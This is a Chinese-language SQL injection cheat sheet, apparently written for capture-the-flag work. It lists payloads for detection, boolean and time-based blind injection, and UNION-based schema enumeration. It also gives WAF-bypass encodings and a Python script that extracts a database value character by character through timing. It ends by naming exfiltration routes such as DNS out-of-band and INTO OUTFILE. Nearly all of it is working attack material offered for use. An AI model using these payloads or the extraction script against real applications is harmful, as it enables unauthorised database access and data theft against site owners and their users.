# SQL 注入

## 探测（按代价从低到高）

```
'            # 单引号：500/报错/内容变化 = 有注入
' AND '1'='2  # 布尔对照
' OR 1=1-- -  # 万能
1' AND SLEEP(3)-- -     # 时间盲注（无回显时唯一可靠信号）
' AND (SELECT 1 FROM (SELECT SLEEP(3))a)-- -
```

- 数字型：`1 AND 1=1` / `1 AND 1=2`
- 字符串型：`' AND '1'='1`
- 括号型：`) AND 1=1-- -`、`') AND 1=1-- -`
- 注释：`-- -`（MySQL 需要空格）、`#`、`/* */`

## 判定

| 现象 | 类型 |
|---|---|
| 报错信息回显（`SQL syntax`） | 报错注入 |
| 内容随真假变化 | 布尔盲注 |
| 延时稳定出现 | 时间盲注 |
| 响应里直接多出数据 | UNION |
| **500 随输入变化** | 也是注入（后端没兜异常） |

## UNION

```sql
' ORDER BY 1-- -     -- 逐步加数字测列数
' ORDER BY 5-- -
' UNION SELECT 1,2,3,4-- -
' UNION SELECT 1,@@version,3,4-- -
' UNION SELECT 1,database(),3,4-- -
' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
```

## 绕过 WAF

| 目标 | 手法 |
|---|---|
| 空格被拦 | `/**/`、`%09`、`%0a`、`+`、括号 `select(1)` |
| 关键字被拦 | 大小写 `SeLeCt`、`selec/**/t`、内联注释 `/*!50000select*/` |
| 引号被拦 | 十六进制 `0x61646d696e`、`CHAR(97,100)` |
| 等号被拦 | `LIKE`、`BETWEEN`、`IN`、`REGEXP` |
| 逗号被拦 | `LIMIT 1 OFFSET 1`、`JOIN` 代替 `UNION SELECT` |

## 时间盲注模板

```python
import requests, time
def blind(payload):
    t = time.time()
    requests.get(URL, params={"id": f"1 AND {payload}-- -"}, timeout=15)
    return time.time() - t > 2.5
# 先确认 sleep 有效，再逐字符取
def get_char(pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if blind(f"(SELECT ASCII(SUBSTR((SELECT flag FROM flag),{pos},1)))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)
```

## 写完数据的出口

- 有回显：直接读
- 无回显：时间盲注 / 布尔盲注 / DNS 外带 / 写文件（`INTO OUTFILE`，需要 FILE 权限 + 目录可写 + `secure_file_priv` 允许）
- 数据不在当前库：`information_schema` → 其他 schema → 其他表
